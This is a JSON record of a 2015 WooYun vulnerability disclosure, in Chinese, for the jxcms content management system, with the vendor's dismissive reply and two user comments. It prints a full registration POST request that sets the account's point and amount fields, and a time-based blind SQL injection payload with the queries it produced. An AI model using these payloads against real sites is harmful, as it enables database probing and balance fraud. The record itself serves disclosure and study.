{"id": 36429, "wybug_id": "wooyun-2015-0101875", "wybug_title": "精讯cms sql注入 和 任意刷钱和积分漏洞", "wybug_corp": "jxcms.com", "wybug_author": "路人甲", "wybug_date": "2015-03-18 11:38", "wybug_open_date": "2015-06-21 11:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-23：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向公众公开  简要描述： 精讯cms sql注入 和 任意刷钱和积分漏洞 详细说明：  \npublic function reg() {\t\tif ($this -> obj -> isLogin()) {\t\t\t$go = $this -> referer && !strstr($this -> referer, 'login')?$this -> referer:Url :: getUrl('member');\t\t\t$this -> showMsg(L('ALREADY_IS_MEMBER'), $go);\t\t}\t\tif ($this -> isSubmit) {\t\t\tif ($this -> obj -> reg()) {\t\t\t\t$this -> obj -> login($_POST['info']['username'], $_POST['info']['password']);\t\t\t\t$go = $this -> forward?$this -> forward:Url :: getUrl('member');\t\t\t\t$this -> showMsg(L('REGISTER_SUCCESS'), $go);\t\t\t} else $this -> showMsg($this -> obj -> error);\t\t}\t\t$this -> assign('title', L('USER_REG'));\t\t$this -> display('member_reg');\t}\tpublic function profile() {\t\t$this -> obj -> isLogin() or $this -> showMsg(L('LOGIN_FIRST'), Url :: getUrl('member', 'login'));\t\tif ($this -> isSubmit) {\t\t\tif ($this -> obj -> edit()) {\t\t\t\t$this -> showMsg(L('OPERATE_SUCCESS'), $this -> referer);\t\t\t} else $this -> showMsg($this -> obj -> error);\t\t}\t\t$member = $this -> obj -> find(get_cookie('userid'));\t\t$tmp = explode('-', $member['birthday']);\t\t$birthday = array('year' => intval($tmp[0]), 'month' => intval($tmp[1]), 'day' => intval($tmp[2]));\t\t$birthday['timestamp'] = $member['birthday'] != '0000-00-00' ? Func :: timeStamp($member['birthday']) : '';\t\t$this -> assign('birthday', $birthday);\t\t$this -> assign('member', $member);\t\t$this -> assign('title', L('USER_PROFILE'));\t\t$this -> display('member_profile');\t}\n编辑和注册都存在刷钱:\npublic function reg() {\t\tif ($this -> obj -> isLogin()) {\t\t\t$go = $this -> referer && !strstr($this -> referer, 'login')?$this -> referer:Url :: getUrl('member');\t\t\t$this -> showMsg(L('ALREADY_IS_MEMBER'), $go);\t\t}\t\tif ($this -> isSubmit) {\t\t\tif ($this -> obj -> reg()) {\t\t\t\t$this -> obj -> login($_POST['info']['username'], $_POST['info']['password']);\t\t\t\t$go = $this -> forward?$this -> forward:Url :: getUrl('member');\t\t\t\t$this -> showMsg(L('REGISTER_SUCCESS'), $go);\t\t\t} else $this -> showMsg($this -> obj -> error);\t\t}\t\t$this -> assign('title', L('USER_REG'));\t\t$this -> display('member_reg');\t}\tpublic function profile() {\t\t$this -> obj -> isLogin() or $this -> showMsg(L('LOGIN_FIRST'), Url :: getUrl('member', 'login'));\t\tif ($this -> isSubmit) {\t\t\tif ($this -> obj -> edit()) {\t\t\t\t$this -> showMsg(L('OPERATE_SUCCESS'), $this -> referer);\t\t\t} else $this -> showMsg($this -> obj -> error);\t\t}\t\t$member = $this -> obj -> find(get_cookie('userid'));\t\t$tmp = explode('-', $member['birthday']);\t\t$birthday = array('year' => intval($tmp[0]), 'month' => intval($tmp[1]), 'day' => intval($tmp[2]));\t\t$birthday['timestamp'] = $member['birthday'] != '0000-00-00' ? Func :: timeStamp($member['birthday']) : '';\t\t$this -> assign('birthday', $birthday);\t\t$this -> assign('member', $member);\t\t$this -> assign('title', L('USER_PROFILE'));\t\t$this -> display('member_profile');\t}\n发送url:\nPOST /jxcms/upload/index.php?c=member&a=reg HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://localhost/jxcms/upload/index.php?c=member&a=regCookie: CNZZDATA80862620=cnzz_eid%3D973263575-1425454337-http%253A%252F%252Flocalhost%253A8081%252F%26ntime%3D1425951363; bdshare_firstime=1425454416306; CNZZDATA1670348=cnzz_eid%3D2041231052-1425547463-%26ntime%3D1425547463; CKFinder_Settings=LNNDS; 5q2M_2132_saltkey=TNJtXI64; tMAu_2132_saltkey=JmlWB55m; tMAu_2132_lastvisit=1426061040; tMAu_2132_ulastactivity=aac4qmrDgvMMbQn8lDsaj0EN7mYxTcOBDpYZ3l%2FnFqa9sATHz5Qj; 4GLW_2132_saltkey=xsrGKKEh; 4GLW_2132_lastvisit=1426062274; 4GLW_2132_ulastactivity=33febWyp0o%2FuqVB4OwJucth3pEVs9yLX0m9nGj%2FC%2B6lqI2JXPLwe; PHPSESSID=35313d6b4451b6cb3068dec613558296X-Forwarded-For: 8.8.8.8Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 345forward=http%3A%2F%2Flocalhost%2Fjxcms%2Fupload%2Findex.php%3Fc%3Dmember%26a%3Dlogin&info%5BJXCMS_HASH%5D=04e2d9cb5873fa&info%5Bemail%5D=test3%401673.com&info%5Busername%5D=test3&info%5Bpassword%5D=111111&info%5Bpassword%5D=111111&info%5Bgender%5D=0&captcha=tq5d&regagreement=1&submit=%D7%A2+%B2%E1&info%5Bpoint%5D=111111&info%5Bamount%5D=111111\n\n\n\n\nsql注入:\npublic function del() {\t\t$selids = R('selids');\t\tif (!empty($selids)) {\t\t\t$where = strstr($selids, ',')?\"id IN ($selids)\":\"id=$selids\";\t\t\t\t\t\t$data = $this -> where($where) -> select();\n发送url:http://localhost/jxcms/upload/index.php?c=member&a=regpost:selids=1111,222)  or if(ascii(substr((select user()),1,1))=114,benchmark(1000000,md5(123)),1)#抓取sql:2015/3/17 14:14\tDELETE FROM `jcollect` WHERE id IN (1111,222)  or if(ascii(substr((select user()),1,1))=114,benchmark(1000000,md5(123)),1)#)2015/3/17 14:14\tSELECT * FROM `jcollect` WHERE id IN (1111,222)  or if(ascii(substr((select user()),1,1))=114,benchmark(1000000,md5(123)),1)#)   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-21 11:40 厂商回复：  最新状态： 2015-03-23：精迅系统主要是文章系统，资金账户和积分账户只是提供一个字段而已，目前没有开发相关功能，所以即使被人刷了，也不存在大的风险！  ", "replys": "漏洞评价：\n评论\n     2015-03-25 00:05 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  这也提交。也是改字段嘛    \n     2015-06-07 20:23 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  看起来很牛？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}